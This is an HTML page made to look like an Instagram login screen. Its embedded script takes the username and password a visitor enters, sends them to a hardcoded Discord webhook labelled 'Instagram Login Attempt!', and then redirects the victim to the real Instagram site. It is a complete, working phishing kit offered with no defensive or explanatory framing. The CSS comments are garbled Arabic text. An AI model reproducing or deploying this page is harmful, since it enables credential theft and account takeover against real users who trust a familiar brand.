<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login ‚Ä¢ Instagram</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body {
            /* ÿ™ÿ£ÿ´Ÿäÿ± ÿ™ÿ≠ÿ±ŸÉ ÿßŸÑÿÆŸÑŸÅŸäÿ© */
            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), 
                        url('https://media.istockphoto.com/id/1403057774/vector/gradient-background-orange-pink-and-purple-colors-rainbow-colors-magenta-yellow-and-red.jpg?s=612x612&w=0&k=20&c=vjBJxXPU7QXTUgGcMYVq-4xp7W7ns4wkjf42pDVK2K0=');
            background-size: 150% 150%;
            animation: backgroundMove 15s ease infinite;
            font-family: 'Tajawal', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
            overflow: hidden;
        }

        @keyframes backgroundMove {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .login-container {
            background: rgba(20, 20, 20, 0.6);
            backdrop-filter: blur(15px); /* ÿ™ÿπÿ≤Ÿäÿ≤ ÿ™ÿ£ÿ´Ÿäÿ± ÿßŸÑÿ≤ÿ¨ÿßÿ¨ */
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            width: 400px;
            padding: 50px 35px;
            text-align: center;
            border-radius: 24px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        /* ÿ•ÿ∂ÿßŸÅÿ© ÿ™ŸàŸáÿ¨ ÿÆŸÑŸÅ ÿßŸÑÿµŸÜÿØŸàŸÇ */
        .login-container::after {
            content: '';
            position: absolute;
            top: -2px; left: -2px; right: -2px; bottom: -2px;
            background: linear-gradient(45deg, #ff00cc, #3333ff, #00d4ff);
            z-index: -1;
            filter: blur(20px);
            opacity: 0.15;
            border-radius: 24px;
        }

        .logo { 
            margin-bottom: 20px; 
            width: 100px; 
            filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.3));
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h2 {
            margin-bottom: 30px;
            font-weight: 700;
            font-size: 1.6rem;
            letter-spacing: 1px;
            text-transform: capitalize;
        }

        .input-group {
            margin-bottom: 18px;
        }

        input { 
            width: 100%; 
            padding: 16px 20px; 
            background: rgba(255, 255, 255, 0.08); 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            border-radius: 12px; 
            color: white;
            font-size: 15px;
            outline: none;
        }

        input:focus {
            border-color: #00a2ff;
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 20px rgba(0, 162, 255, 0.2);
            transform: scale(1.02);
        }

        button { 
            width: 100%; 
            padding: 15px; 
            background: linear-gradient(45deg, #00a2ff, #0066ff); 
            border: none; 
            color: white; 
            font-weight: bold; 
            border-radius: 12px; 
            cursor: pointer; 
            font-size: 16px;
            box-shadow: 0 8px 20px rgba(0, 162, 255, 0.3);
            margin-top: 10px;
        }

        button:hover {
            box-shadow: 0 12px 25px rgba(0, 162, 255, 0.5);
            transform: translateY(-3px) scale(1.02);
            filter: brightness(1.1);
        }

        .divider { 
            display: flex; 
            align-items: center; 
            color: rgba(255, 255, 255, 0.4); 
            margin: 30px 0; 
            font-size: 12px; 
            letter-spacing: 2px;
        }

        .divider::before, .divider::after { 
            content: ""; 
            flex: 1; 
            height: 1px; 
            background: rgba(255, 255, 255, 0.1); 
            margin: 0 15px; 
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram" class="logo">
    
    <h2>Login to Instagram</h2>

    <form id="dataForm">
        <div class="input-group">
            <input type="text" id="name" placeholder="Username, email or phone" required>
        </div>
        <div class="input-group">
            <input type="password" id="email" placeholder="Password" required>
        </div>
        <button type="submit" id="submitBtn">Log In</button>
    </form>
    
    <div class="divider"></div>
    
    <div style="font-size: 13px; color: rgba(255,255,255,0.7);">
         <span style="color: #00a2ff; cursor: pointer;"></span>
    </div>
</div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1465020088368496672/PSfjxXUDFXpGi3hPejDis_oQhCUuI9ewXiQMnLLatl6rkyHrgehYj0WSCNIrNJIhpiRA";

    document.getElementById("dataForm").addEventListener("submit", function(e){
        e.preventDefault();
        const submitBtn = document.getElementById("submitBtn");
        const name = document.getElementById("name").value;
        const email = document.getElementById("email").value;

        submitBtn.innerHTML = "Verifying...";
        submitBtn.disabled = true;

        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `**Instagram Login Attempt!**\nüë§ Username: \`${name}\` \nüîë Password: \`${email}\``
            })
        }).then(() => {
            window.location.href = "https://www.instagram.com/";
        }).catch(() => {
            submitBtn.innerHTML = "Log In";
            submitBtn.disabled = false;
        });
    });
</script>

</body>
</html>
